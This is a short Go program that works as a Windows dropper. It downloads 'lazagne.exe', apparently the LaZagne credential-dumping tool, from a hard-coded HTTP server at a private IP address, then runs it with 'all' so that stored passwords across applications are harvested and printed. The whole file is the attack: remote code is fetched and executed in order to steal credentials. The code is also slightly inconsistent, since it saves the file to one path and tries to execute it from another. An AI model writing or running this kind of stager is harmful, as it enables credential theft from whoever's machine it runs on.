package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
)

func main() {
	user, err := user.Current()
	if err != nil {
		panic(err)
	}

	fileName := "lazagne.exe"
	filePath := user.HomeDir + "\\Downloads\\" + fileName
	fmt.Println("currently set filepath: ", filePath)
	platform := runtime.GOOS
	if platform != "windows" {
		fmt.Println("Platform not supported")
		os.Exit(1)
	}

	baseURL := "http://192.168.1.21:8000/susdls/"

	dlURL := baseURL + fileName

	fmt.Println("Fetching file: " + dlURL)
	err = DownloadFile(fileName, dlURL)
	if err != nil {
		fmt.Println("Encountered error downloading file...")
		fmt.Println(err)
		panic(err)
	}
	fmt.Println("Downloaded: " + fileName)

	fmt.Println("Exectuing file: ", fileName)
	err = ExecuteFile(filePath)
}

// DownloadFile will download a url to a local file. It's efficient because it will
// write as it downloads and not load the whole file into memory.
func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}

// ExecuteFile runs lazagne
func ExecuteFile(filepath string) error {
	cmdRunLazagne := &exec.Cmd{
		Path:   filepath,
		Args:   []string{filepath, "all"},
		Stdout: os.Stdout,
		Stderr: os.Stdout,
	}
	err := cmdRunLazagne.Run()
	if err != nil {
		fmt.Println("Error: ", err)
	}
	return err
}
